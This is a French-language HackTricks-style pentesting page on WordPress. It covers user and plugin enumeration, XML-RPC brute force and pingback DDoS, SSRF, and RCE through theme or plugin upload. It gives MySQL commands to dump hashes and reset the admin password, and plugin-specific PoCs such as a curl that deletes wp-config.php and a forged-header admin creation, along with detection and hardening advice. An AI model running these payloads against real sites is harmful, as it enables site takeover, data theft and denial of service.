# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles comme la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par e-mail lors de la cr√©ation d'un nouveau site WordPress.
- Dossiers de connexion (peuvent √™tre renomm√©s pour les cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier qui repr√©sente une fonctionnalit√© de WordPress permettant la transmission de donn√©es avec HTTP comme m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par le WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le r√©pertoire principal o√π les plugins et th√®mes sont stock√©s.
- `wp-content/uploads/` est le r√©pertoire o√π tous les fichiers t√©l√©charg√©s sur la plateforme sont stock√©s.
- `wp-includes/` est le r√©pertoire o√π se trouvent les fichiers core, tels que certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier sitemap XML avec tous les posts publics et les types de posts et taxonomies consultables publiquement.

**Post-exploitation**

- Le fichier `wp-config.php` contient les informations requises par WordPress pour se connecter √† la base de donn√©es telles que le nom de la base de donn√©es, l'h√¥te de la base, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et salts, et le pr√©fixe des tables de la base. Ce fichier de configuration peut √©galement √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le d√©pannage.

### Permissions des utilisateurs

- **Administrateur**
- **√âditeur** : Publie et g√®re ses propres posts et ceux des autres
- **Auteur** : Publie et g√®re ses propres posts
- **Contributeur** : R√©dige et g√®re ses posts mais ne peut pas les publier
- **Abonn√©** : Parcourt les posts et modifie son profil

## **√ânum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple depuis [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers de liens CSS

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### R√©cup√©rer les th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins and Themes

Vous ne pourrez probablement pas trouver tous les Plugins and Themes possibles. Pour en d√©couvrir la totalit√©, vous devrez **actively Brute Force a list of Plugins and Themes** (heureusement pour nous, il existe des outils automatis√©s qui contiennent ces listes).

### Users

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez √©galement tenter d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut r√©v√©ler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publi√© un post. **Seules les informations concernant les utilisateurs qui ont activ√© cette fonctionnalit√© seront fournies**.

Notez aussi que **/wp-json/wp/v2/pages** peut leak des adresses IP.

- **Login username enumeration**: Lors de la connexion via **`/wp-login.php`**, le **message** est **diff√©rent**, indiquant si le **username** existe ou non.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer un credentials brute-force ou l'utiliser pour lancer des attaques DoS vers d'autres ressources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Pour v√©rifier s'il est actif, essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour effectuer un brute-force des credentials. Si vous parvenez √† en trouver une, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Incorrect username or password"_ dans une r√©ponse avec code 200 doit s'afficher si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les bons identifiants, vous pouvez t√©l√©verser un fichier. Dans la r√©ponse, le chemin appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe aussi une mani√®re **plus rapide** de brute-force des credentials en utilisant **`system.multicall`**, car vous pouvez essayer plusieurs credentials dans la m√™me requ√™te :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Cette m√©thode est destin√©e aux programmes et non aux humains, et est ancienne ; par cons√©quent elle ne supporte pas la 2FA. Donc, si vous avez des creds valides mais que l'acc√®s principal est prot√©g√© par la 2FA, **vous pourriez √™tre capable d'abuser de xmlrpc.php pour vous connecter avec ces creds en contournant la 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions disponibles via la console, mais vous pourriez quand m√™me parvenir √† une RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si vous trouvez la m√©thode _**pingback.ping**_ dans la liste, vous pouvez faire en sorte que Wordpress envoie une requ√™te arbitraire √† n'importe quel h√¥te/port.\
Cela peut √™tre utilis√© pour demander √† **des milliers** de **sites** Wordpress d'**acc√©der** au m√™me **emplacement** (provoquant ainsi un **DDoS** sur cette cible) ou vous pouvez l'utiliser pour faire **Wordpress** **scan** un **network** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Consultez l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier se trouve g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Quand ce fichier est **accessed** une requ√™te MySQL **"heavy"** est ex√©cut√©e, donc il peut √™tre utilis√© par des **attackers** pour **cause** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (√† chaque fois qu'un client demande une page Wordpress), ce qui sur des sites √† fort trafic peut poser des probl√®mes (DoS).

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un vrai cronjob sur l'h√¥te qui ex√©cute les actions n√©cessaires √† intervalles r√©guliers (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Worpress peut effectuer une requ√™te vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie si le **methodName: pingback.ping** existe et si le chemin **/wp-json/oembed/1.0/proxy** est pr√©sent ; si c'est le cas, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'acc√®s en √©crasant un bit

Plut√¥t qu'une vraie attaque, il s'agit d'une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser un bit de n'importe quel fichier wordpress. Ainsi, vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour transformer l'op√©ration NOT (`!`) en NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panneau RCE**

**Modifier un php du th√®me utilis√© (identifiants admin n√©cessaires)**

Apparence ‚Üí √âditeur de th√®me ‚Üí Mod√®le 404 (√† droite)

Remplacez le contenu par un shell php :

![](<../../images/image (384).png>)

Cherchez sur Internet comment acc√©der √† cette page mise √† jour. Dans ce cas vous devez acc√©der ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Il peut √™tre possible de t√©l√©verser des fichiers .php en tant que plugin.\
Cr√©ez votre php backdoor en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

T√©l√©versez le plugin et appuyez sur Install Now :

![](<../../images/image (249).png>)

Cliquez sur Procced:

![](<../../images/image (70).png>)

Probablement cela n'agira apparemment pas, mais si vous allez dans Media, vous verrez votre shell t√©l√©vers√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter la reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette m√©thode implique l'installation d'un plugin malveillant connu pour √™tre vuln√©rable et pouvant √™tre exploit√© pour obtenir un web shell. Ce processus s'effectue via le tableau de bord WordPress comme suit :

1. **Acquisition du plugin** : Le plugin est obtenu depuis une source comme Exploit DB, par exemple [**here**](https://www.exploit-db.com/exploits/36374).
2. **Installation du plugin** :
- Allez dans le tableau de bord WordPress, puis `Dashboard > Plugins > Upload Plugin`.
- T√©l√©versez le fichier zip du plugin t√©l√©charg√©.
3. **Activation du plugin** : Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le tableau de bord.
4. **Exploitation** :
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu pour √™tre vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, accordant un acc√®s non autoris√© au site.
- Il est not√© que ceci n'est qu'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles montrant les √©tapes dans le tableau de bord WordPress pour installer et activer le plugin. Cependant, il est important de noter que l'exploitation de vuln√©rabilit√©s de cette fa√ßon est ill√©gale et contraire √† l'√©thique sans autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un contexte l√©gal, tel que penetration testing avec permission explicite.

**Pour des √©tapes plus d√©taill√©es, consultez :** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS √† RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© **Cross-Site Scripting (XSS)** vers une **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos, consultez [**cet article**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il offre **un support pour les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :**
- _**Privilege Escalation:**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ T√©l√©versez votre plugin personnalis√© (backdoor) dans WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Modifie les plugins int√©gr√©s dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ Modifie les th√®mes int√©gr√©s dans WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personnalis√©s pour des plugins/th√®mes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe admin :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Surface d'attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s dans celles-ci. Vous pouvez trouver comment un plugin pourrait exposer des fonctionnalit√©s dans les points suivants et quelques exemples de plugins vuln√©rables dans [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Une des mani√®res dont un plugin peut exposer des fonctions aux utilisateurs est via des handlers AJAX. Ceux-ci peuvent contenir des bugs de logique, d'authorization, ou d'authentication. De plus, il est assez fr√©quent que ces fonctions basent √† la fois l'authentication et l'authorization sur l'existence d'un Wordpress nonce que **tout utilisateur authentifi√© dans l'instance Wordpress pourrait poss√©der** (ind√©pendamment de son r√¥le).

Ce sont les fonctions qui peuvent √™tre utilis√©es pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible √† n'importe quel utilisateur (m√™me non authentifi√©).**

> [!CAUTION]
> De plus, si la fonction ne v√©rifie l'autorisation de l'utilisateur qu'avec la fonction `wp_verify_nonce`, cette fonction v√©rifie seulement que l'utilisateur est connect√©, elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Ainsi, des utilisateurs peu privil√©gi√©s pourraient acc√©der √† des actions √† privil√®ges √©lev√©s.

- **REST API**

Il est √©galement possible d'exposer des fonctions de wordpress en enregistrant une rest AP √† l'aide de la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est une fonction de rappel qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction interne `__return_true` est utilis√©e, elle contournera simplement la v√©rification des permissions utilisateur.**

- **Acc√®s direct au fichier PHP**

Bien s√ªr, Wordpress utilise PHP et les fichiers √† l'int√©rieur des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalit√© vuln√©rable qui est d√©clench√©e simplement en acc√©dant au fichier, elle pourra √™tre exploit√©e par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Certains plugins impl√©mentent des raccourcis de ‚Äútrusted header‚Äù pour des int√©grations internes ou des reverse proxies, puis utilisent cet en-t√™te pour d√©finir le contexte utilisateur courant pour les requ√™tes REST. Si l'en-t√™te n'est pas li√© cryptographiquement √† la requ√™te par un composant en amont, un attaquant peut le falsifier et acc√©der aux routes REST privil√©gi√©es en tant qu'administrateur.

- Impact : √©l√©vation de privil√®ges non authentifi√©e vers admin en cr√©ant un nouvel administrateur via la core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, g√©n√©ralement le premier compte administrateur).
- Route exploit√©e : `POST /wp-json/wp/v2/users` avec un tableau de r√¥le √©lev√©.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi √ßa fonctionne

- Le plugin mappe un header contr√¥l√© par le client √† l'√©tat d'authentification et saute les v√©rifications de capability.
- WordPress core attend la capability `create_users` pour cette route ; le hack du plugin la contourne en d√©finissant directement le contexte du current user depuis le header.

Indicateurs de succ√®s attendus

- HTTP 201 avec un corps JSON d√©crivant l'utilisateur cr√©√©.
- Un nouvel admin visible dans `wp-admin/users.php`.

Checklist de d√©tection

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des headers personnalis√©s pour d√©finir le contexte utilisateur (par ex. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revoir les enregistrements REST pour des callbacks privil√©gi√©s qui manquent de v√©rifications robustes `permission_callback` et qui comptent √† la place sur des headers de requ√™te.
- Chercher des usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) √† l'int√©rieur des handlers REST qui ne sont prot√©g√©s que par la valeur d'un header.

Renforcement

- Ne jamais d√©duire l'authentification ou l'autorisation √† partir de headers contr√¥l√©s par le client.
- Si un reverse proxy doit injecter l'identit√©, terminer la confiance au proxy et supprimer les copies entrantes (par ex. `unset X-Wcpay-Platform-Checkout-User` en bordure), puis passer un token sign√© et le v√©rifier c√¥t√© serveur.
- Pour les routes REST ex√©cutant des actions privil√©gi√©es, exiger des v√©rifications `current_user_can()` et un `permission_callback` strict (NE PAS utiliser `__return_true`).
- Pr√©f√©rer l'auth first-party (cookies, application passwords, OAuth) plut√¥t que l'¬´ impersonation ¬ª via headers.

References : voir les liens √† la fin de cette page pour un cas public et une analyse plus large.

### Suppression arbitraire de fichiers sans authentification via wp_ajax_nopriv (Litho Theme <= 3.0)

Les themes et plugins WordPress exposent fr√©quemment des handlers AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilis√©e **le callback devient accessible aux visiteurs non authentifi√©s**, donc toute action sensible doit en plus impl√©menter :

1. Un **contr√¥le de capability** (par ex. `current_user_can()` ou au moins `is_user_logged_in()`), et
2. Un **nonce CSRF** valid√© avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. Une **sanitisation / validation stricte des entr√©es**.

Le th√®me multipurpose Litho (< 3.1) a oubli√© ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par livrer le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Acc√®s non authentifi√©** ‚Äì le hook `wp_ajax_nopriv_` est enregistr√©.
* **Pas de v√©rification du nonce / des capabilities** ‚Äì tout visiteur peut appeler le endpoint.
* **Pas de sanitisation du chemin** ‚Äì la cha√Æne contr√¥l√©e par l'utilisateur `fontfamily` est concat√©n√©e √† un chemin de fichier sans filtrage, permettant le classique `../../` traversal.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **sous le r√©pertoire de base uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requ√™te HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. La suppression de `wp-config.php` force WordPress √† lancer le *installation wizard* lors de la prochaine visite, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration DB et cr√©e un admin user).

D'autres cibles importantes incluent les fichiers plugin/theme `.php` (pour neutraliser les plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Liste de contr√¥le de d√©tection

* Tout callback `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers du syst√®me de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concat√©nation d'entr√©es utilisateur non assainies dans des chemins (recherchez `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et de `current_user_can()`/`is_user_logged_in()`.

#### Durcissement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** traitez toute op√©ration d'√©criture/suppression sur le disque comme privil√©gi√©e et v√©rifiez attentivement :
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Escalade de privil√®ges via restauration de r√¥le obsol√®te et absence d'autorisation (ASE "View Admin as Role")

De nombreux plugins impl√©mentent une fonctionnalit√© "view as role" ou de changement de r√¥le temporaire en enregistrant le(s) r√¥le(s) d'origine dans les user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration repose uniquement sur des param√®tres de requ√™te (par ex., `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans v√©rifier les capabilities et un nonce valide, cela devient une escalade de privil√®ges verticale.

Un exemple r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de reset restaurait les r√¥les en se basant sur `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni un contr√¥le `current_user_can()` ni une v√©rification du nonce avant de supprimer les r√¥les actuels et de r√©ajouter les r√¥les sauvegard√©s depuis le user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c‚Äôest exploitable

- Fait confiance √† `$_REQUEST['reset-for']` et √† une option du plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait pr√©c√©demment des privil√®ges plus √©lev√©s enregistr√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en acc√©dant au chemin de r√©initialisation.
- Dans certains d√©ploiements, tout utilisateur authentifi√© pouvait d√©clencher une r√©initialisation pour un autre nom d'utilisateur toujours pr√©sent dans `viewing_admin_as_role_are` (autorisation cass√©e).

Attack prerequisites

- Vulnerable plugin version with the feature enabled.
- Target account has a stale high-privilege role stored in user meta from earlier use.
- Any authenticated session; missing nonce/capability on the reset flow.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les builds vuln√©rables, cela supprime les r√¥les actuels et r√©ajoute les r√¥les originaux sauvegard√©s (par ex., `administrator`), entra√Ænant une escalade de privil√®ges.

Detection checklist

- Rechercher des fonctionnalit√©s de changement de r√¥le qui conservent les r√¥les originaux dans user meta (par ex., `_asenha_view_admin_as_original_roles`).
- Identifier les chemins de reset/restauration qui :
- Lire les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifier les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
- Autoriser en se basant sur un tableau d'options du plugin (par ex., `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

Hardening

- Appliquer des contr√¥les de capacit√© sur chaque branche modifiant l'√©tat (par ex., `current_user_can('manage_options')` ou plus strict).
- Exiger des nonces pour toutes les modifications de r√¥le/permission et les v√©rifier : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne jamais faire confiance aux noms d'utilisateur fournis par la requ√™te ; r√©soudre l'utilisateur cible c√¥t√© serveur en fonction de l'acteur authentifi√© et d'une politique explicite.
- Invalider l'√©tat des r√¥les originaux lors des mises √† jour du profil/du r√¥le pour √©viter la restauration obsol√®te de privil√®ges √©lev√©s :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un √©tat minimal et d'utiliser des tokens limit√©s dans le temps et prot√©g√©s par capability pour les changements de r√¥le temporaires.

---

### √âl√©vation de privil√®ges sans authentification via user-switching bas√© sur cookie sur le hook public `init` (Service Finder ‚Äúsf-booking‚Äù)

Certains plugins connectent des helpers de user-switching au hook public `init` et d√©rivent l'identit√© depuis un cookie contr√¥l√© par le client. Si le code appelle `wp_set_auth_cookie()` sans v√©rifier l'authentification, la capability et un nonce valide, tout visiteur non authentifi√© peut forcer la connexion avec n'importe quel ID utilisateur.

Pattern vuln√©rable typique (simplifi√© depuis Service Finder Bookings ‚â§ 6.1) :
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c'est exploitable

